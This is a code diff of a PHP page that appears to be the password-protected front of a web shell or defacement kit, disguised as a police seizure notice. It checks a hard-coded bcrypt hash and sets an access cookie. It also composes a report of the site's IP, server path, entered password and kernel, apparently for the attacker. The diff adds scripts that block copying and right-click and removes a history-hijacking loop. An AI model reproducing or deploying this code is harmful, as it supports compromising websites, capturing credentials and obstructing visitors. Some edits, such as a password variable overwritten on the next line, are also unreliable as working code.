@@ -86,14 +86,32 @@ if (is_logged_in()) {
     if (isset($_POST['password'])) {
         $entered_key = $_POST['password'];
         $hashed_key = '$2y$10$iOYuvQ3wWdGk4koyeRWrL.HTtw4Zf9T0zWvjUu37vlTY7qt0i6bOy';
-echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';
+echo '<script type="text/javascript"> 
+	function disableselect(e){  
+	return false  
+	}  
+
+	function reEnable(){  
+	return true  
+	}  
+
+	//if IE4+  
+	document.onselectstart=new Function ("return false")  
+	document.oncontextmenu=new Function ("return false")  
+	//if NS6  
+	if (window.sidebar){  
+	document.onmousedown=disableselect  
+	document.onclick=reEnable  
+	}
+</script><audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';
 
  // https://bcrypt.online/
         
         if (password_verify($entered_key, $hashed_key)) {
             setcookie('user_id', 'LPH', time() + 3600, '/'); 
-            header("Location: ".$_SERVER['PHP_SELF']); 
+header("Location: ".$_SERVER['PHP_SELF']); 
 $password = $_POST['password'];
+$password = $_POST['pass'];		
 $server_name = $_SERVER['SERVER_NAME'];
 $php_self = $_SERVER['PHP_SELF'];
 $report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " City: {$city}nLogin: $server_name$php_selfnPass: $passwordnKernel: $kernel";
@@ -105,6 +123,7 @@ $report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " City: {$city}nLogin: $server_
     ?>
     <!DOCTYPE html>
  <html><head>
+	 
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -133,29 +152,29 @@ $report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " City: {$city}nLogin: $server_
         </script>
         
 
-<body>
-        
 
-<script type="text/JavaScript">
-
-     function disableselect(e) {
-          return false
-        }
-        
-        function reEnable() {
-          return true
-        }
-        
-        document.onselectstart = new Function ("return false")
-        
-        if (window.sidebar) {
-          document.onmousedown = disableselect
-          document.onclick = reEnable
-        }
-        </script>
-        
+	 
 
 <body>
+	<script type="text/javascript"> 
+	function disableselect(e){  
+	return false  
+	}  
+
+	function reEnable(){  
+	return true  
+	}  
+
+	//if IE4+  
+	document.onselectstart=new Function ("return false")  
+	document.oncontextmenu=new Function ("return false")  
+	//if NS6  
+	if (window.sidebar){  
+	document.onmousedown=disableselect  
+	document.onclick=reEnable  
+	}
+</script>
+
 <div class="bg-container" id="bg-container">
     <img src="https://github.com/DanteLorenzo/FBI-Seized/raw/master/src/img/landscape.svg" alt="Landscape" class="bg-landscape">
 </div>
@@ -205,14 +224,6 @@ Sesuai Dengan Surat Perintah Penyitaan<br>Nomor : SP / 18 / III / 2024
 
            </div>
 
-<script>
-function ClearError() {return true;}window.onerror = ClearError;
-	 (function () {
-	 for(var i = 0; i < 20; i++) {
-	 history.pushState(null, document.title, window.location.href );
-	 }
-	 })(document, window, history);
-</script>
 
         <script>
             function createSnowflake() {
